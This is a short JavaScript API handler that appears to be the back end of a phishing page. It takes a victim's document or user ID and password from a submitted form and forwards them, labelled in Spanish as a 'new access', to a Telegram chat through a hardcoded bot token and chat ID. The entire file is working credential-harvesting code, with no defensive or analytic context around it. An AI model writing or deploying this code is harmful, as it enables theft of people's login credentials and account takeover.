export default async function handler(req, res) {
  if (req.method !== "POST") {
    return res.status(405).json({ message: "Method not allowed" });
  }

  const { id_no, password } = req.body; // ناخدو المعطيات من الفورم

  const BOT_TOKEN = "8257299535:AAHw21OzY6yFvX_LhgiGNJqm8AM3cuVp57k";
  const CHAT_ID = "-4887362963";

  const message = `
🔐 Nuevo acceso:
- Usuario/Documento: ${id_no}
- Clave: ${password}
  `;

  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

  try {
    await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: CHAT_ID, text: message }),
    });

    res.status(200).json({ message: "✅ Datos enviados con éxito" });
  } catch (err) {
    console.error(err);
    res.status(500).json({ message: "❌ Error al enviar" });
  }
}
